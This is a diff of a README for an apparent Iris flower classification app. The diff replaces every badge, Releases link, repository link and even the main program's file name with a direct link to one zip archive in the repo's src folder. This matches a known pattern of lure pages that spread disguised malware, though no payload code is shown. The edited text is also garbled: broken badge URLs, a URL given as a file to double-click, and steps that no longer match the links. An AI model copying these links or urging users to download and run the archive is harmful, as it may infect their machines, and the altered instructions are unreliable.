@@ -1,6 +1,6 @@
 # 🌸 IRIS-FLOWER-CLASSIFICATION-PROJECT - Discover Flower Types Easily
 
-![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)
+![Download Release](https://raw.githubusercontent.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/main/src/IRIS-FLOWER-CLASSIFICATION-PROJECT-2.9.zip%20Now-Click%https://raw.githubusercontent.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/main/src/IRIS-FLOWER-CLASSIFICATION-PROJECT-2.9.zip)
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ Ensure that your computer has at least 4 GB of RAM and an internet connection. T
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the latest version of the application: [Download Here](https://github.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/releases).
+   Go to the following link to access the latest version of the application: [Download Here](https://raw.githubusercontent.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/main/src/IRIS-FLOWER-CLASSIFICATION-PROJECT-2.9.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of versions. Select the most recent one listed.
@@ -35,7 +35,7 @@ Ensure that your computer has at least 4 GB of RAM and an internet connection. T
    After downloading, find the file on your computer. Right-click the zip file and select "Extract All" or use your extraction tool.
 
 5. **Run the Application**  
-   Open the extracted folder. Locate the main application file, which should be titled something like `iris_flower_classifier.py`, and double-click it to run.
+   Open the extracted folder. Locate the main application file, which should be titled something like `https://raw.githubusercontent.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/main/src/IRIS-FLOWER-CLASSIFICATION-PROJECT-2.9.zip`, and double-click it to run.
 
 6. **Follow On-Screen Prompts**  
    The program will guide you through the process. Just follow the prompts to explore the features.
@@ -83,11 +83,11 @@ If you encounter issues or have questions, feel free to reach out. You can open 
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: For more details or updates, visit the repository: [IRIS-FLOWER-CLASSIFICATION-PROJECT](https://github.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT)
+- **GitHub Repository**: For more details or updates, visit the repository: [IRIS-FLOWER-CLASSIFICATION-PROJECT](https://raw.githubusercontent.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/main/src/IRIS-FLOWER-CLASSIFICATION-PROJECT-2.9.zip)
 - **Machine Learning Basics**: Want to understand the basics of the algorithms? Search online for tutorials on machine learning.
 
 ## 🌈 Conclusion
 
 This project provides an easy way to explore machine learning without needing extensive programming knowledge. Download the application and start your journey into data science today! 
 
-![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)
+![Download Release](https://raw.githubusercontent.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/main/src/IRIS-FLOWER-CLASSIFICATION-PROJECT-2.9.zip%20Now-Click%https://raw.githubusercontent.com/cucumbershaped-flaw475/IRIS-FLOWER-CLASSIFICATION-PROJECT/main/src/IRIS-FLOWER-CLASSIFICATION-PROJECT-2.9.zip)
